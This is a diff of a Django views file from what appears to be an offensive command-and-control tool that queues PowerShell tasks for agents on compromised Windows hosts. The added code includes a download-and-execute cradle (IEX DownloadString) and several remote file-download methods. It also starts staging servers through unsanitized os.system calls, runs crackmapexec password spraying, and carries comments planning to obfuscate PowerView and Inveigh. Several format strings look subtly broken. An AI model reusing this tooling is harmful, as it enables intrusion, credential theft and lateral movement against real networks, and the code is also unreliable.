@@ -4,12 +4,17 @@ from blog.models import *
 
 current_path= os.path.dirname(os.path.abspath(__file__))
 
+
 #### we need to download modules & tools from ../general/ on the windows machine
 
 
+###### PowerView.ps1 need to >>>> obfuscation
+###### Inveigh.ps1   need to >>>> obfuscation
 
 
-
+###### To download on agent:
+# local python server
+# Downloadfile
 
 def linkedin_users(request, agent='' , comp='', linkedin_mail='' , linkedin_password=''):
     if request.method=='POST':   
@@ -302,7 +307,7 @@ def groupInfo(request):
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
         group = request.POST['group']
-        task = 'import-module $env:USERPROFILE\Microsoft.ActiveDirectory.Management.dll;echo "===============Get-ADGroup===============";Get-ADGroup -Identity "{group}";echo "===============Get-DomainGroupMember===============";Get-ADGroupMember -Identity "{group}" '.format(group)
+        task = '(New-Object Net.WebClient).DownloadFileAsync("https://raw.githubusercontent.com/samratashok/ADModule/master/Microsoft.ActiveDirectory.Management.dll", $env:USERPROFILE+"/Microsoft.ActiveDirectory.Management.dll");import-module $env:USERPROFILE\Microsoft.ActiveDirectory.Management.dll;echo "===============Get-ADGroup===============";Get-ADGroup -Identity "{group}";echo "===============Get-DomainGroupMember===============";Get-ADGroupMember -Identity "{group}" '.format(group)
         
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -453,7 +458,7 @@ def TrustRelations(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "===============TrustRelationships===============";import-module $env:USERPROFILE\Microsoft.ActiveDirectory.Management.dll;Get-ADTrust -Filter *'
+        task = 'echo "===============TrustRelationships===============";(New-Object Net.WebClient).DownloadFileAsync("https://raw.githubusercontent.com/samratashok/ADModule/master/Microsoft.ActiveDirectory.Management.dll", $env:USERPROFILE+"/Microsoft.ActiveDirectory.Management.dll");import-module $env:USERPROFILE\Microsoft.ActiveDirectory.Management.dll;Get-ADTrust -Filter *'
         
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -477,20 +482,185 @@ def TrustMap(request, agent=''):
         return render(request, 'blog/listeners.html')
 
 ##download on target    
-def DownloadonWindows(request, url='', outpath=''):
+def Download_IWR(request, url='', outpath=''):
     if request.method=='POST':
         agent = request.POST['agent']
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = '[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls";iwr -Uri {} -OutFile {}'.format(url, outpath)
+        task = '[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls";iwr -UseBasicParsing {} -OutFile {}'.format(url, outpath)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
             f.close()
         return JsonResponse({},status=200)
 
+    else:
+        return render(request, 'blog/listeners.html')
+
+def DownloadFileAsync(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        url = request.POST['url']
+        outpath = request.POST['outpath']
+        task = "(New-Object Net.WebClient).DownloadFileAsync('{url}', '{outpath}')".format(url, outpath)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+
+    else:
+        return render(request, 'blog/listeners.html')
+
+def DownloadString(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        url = request.POST['url']
+        task = "IEX (New-Object Net.WebClient).DownloadString('{url}')".format(url)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+
+    else:
+        return render(request, 'blog/listeners.html')
+
+
+def Download_SMB(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        url = request.POST['url']
+        task = "copy \\{ip}:{port}\share\{fileName}".format(url)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+
+    else:
+        return render(request, 'blog/listeners.html')
+
+def Download_FTP(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        ip = request.POST['ip']
+        filename = request.POST['filename']
+        outpath = request.POST['outpath']
+        task = "(New-Object Net.WebClient).DownloadFile('ftp://{ip}/{filename}', '{outpath}')".format(ip,filename, outpath)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+
+    else:
+        return render(request, 'blog/listeners.html')
+
+
+def open_pythonserver(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        timeout = request.POST['timeout']
+        serverport = request.POST['serverport']
+        directory = request.POST['directory']
+        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
+        result_path = result_dir+"results"
+        os.system("echo '===============Python Server===============\nFor {timeout} seconds' >> {result_path}; timeout {timeout} python3 -m http.server --directory {directory} {serverport};".format(timeout,result_path,directory,serverport))
+        return JsonResponse({},status=200)
+    else:
+        return render(request, 'blog/listeners.html')
+
+def open_SMBserver(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        timeout = request.POST['timeout']
+        serverport = request.POST['serverport']
+
+        directory = request.POST['directory']
+        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
+        result_path = result_dir+"results"
+        os.system("echo '===============SMB Server===============\nFor {timeout} seconds' >> {result_path}; timeout {timeout} impacket-smbserver share -smb2support {directory} -port {port};".format(timeout,result_path,directory,serverport))
+        return JsonResponse({},status=200)
+    else:
+        return render(request, 'blog/listeners.html')
+
+def open_FTPserver(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        timeout = request.POST['timeout']
+        serverport = request.POST['serverport']
+        directory = request.POST['directory']
+        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
+        result_path = result_dir+"results"
+        os.system("echo '===============FTP Server===============\nFor {timeout} seconds' >> {result_path}; timeout {timeout}  python3 -m pyftpdlib --port {serverport} --directory {directory};".format(timeout,result_path,directory,serverport))
+        return JsonResponse({},status=200)
+    else:
+        return render(request, 'blog/listeners.html')        
+
+
+def open_PY_UploadServer(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        timeout = request.POST['timeout']
+        serverport = request.POST['serverport']
+        directory = request.POST['directory']
+        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
+        result_path = result_dir+"results"
+        os.system("echo '===============Python Upload Server===============\nFor {timeout} seconds' >> {result_path}; timeout {timeout}  python3 -m uploadserver --port {serverport} --directory {directory};".format(timeout,result_path,directory,serverport))
+        return JsonResponse({},status=200)
+    else:
+        return render(request, 'blog/listeners.html')
+
+
+def open_FTP_UploadServer(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        timeout = request.POST['timeout']
+        serverport = request.POST['serverport']
+        directory = request.POST['directory']
+        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
+        result_path = result_dir+"results"
+        os.system("echo '===============FTP Upload Server===============\nFor {timeout} seconds' >> {result_path}; timeout {timeout}  python3 -m pyftpdlib --port {serverport} --directory {directory} --write;".format(timeout,result_path,directory,serverport))
+        return JsonResponse({},status=200)
     else:
         return render(request, 'blog/listeners.html')
 
@@ -699,15 +869,31 @@ def GPO_windapsearch(request):
         return render(request, 'blog/listeners.html')
 
 
-def pass_spray(request, agent='', password=''):
+# def pass_spray(request, agent='', password=''):
+#     if request.method=='POST':
+#         task = 'echo "===============Password Spraying===============\nOutPut in the following path:\n$env:USERPROFILE";import-module $env:USERPROFILE\DomainPasswordSpray.ps1;Invoke-DomainPasswordSpray -Password {} -OutFile $env:USERPROFILE\spray_success -ErrorAction SilentlyContinue -Force'.format(password)
+#         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+#         with open(task_path, "w") as f:
+#             f.write(task)
+#             f.close()
+#     else:
+#         return render(request, 'blog/listeners.html')        
+
+def CME_pass_spray(request):
     if request.method=='POST':
-        task = 'echo "===============Password Spraying===============\nOutPut in the following path:\n$env:USERPROFILE";import-module $env:USERPROFILE\DomainPasswordSpray.ps1;Invoke-DomainPasswordSpray -Password {} -OutFile $env:USERPROFILE\spray_success -ErrorAction SilentlyContinue -Force'.format(password)
-        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
-        with open(task_path, "w") as f:
-            f.write(task)
-            f.close()
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        DCip = request.POST['DCip']
+        userslist = request.POST['userslist']
+        password = request.POST['password']
+        result_path = current_path+"/../../data/listeners/agents/{}/results".format(agent)
+        os.system("echo '===============Password Spraying===============' >> {result_path};crackmapexec smb {DCip} -u {userslist} -p {password} | grep + >> {result_path};".format(DCip,userslist,password,result_path))
+        return JsonResponse({},status=200)
     else:
-        return render(request, 'blog/listeners.html')        
+        return render(request, 'blog/listeners.html')
 
 def llmnr_poison(request, agent='', time=0):
     if request.method=='POST':
@@ -752,3 +938,5 @@ def snaffler(request, agent='', domain=''):
 #### we need to get snaffler.log on our machine
     else:
         return render(request, 'blog/listeners.html')
+
+
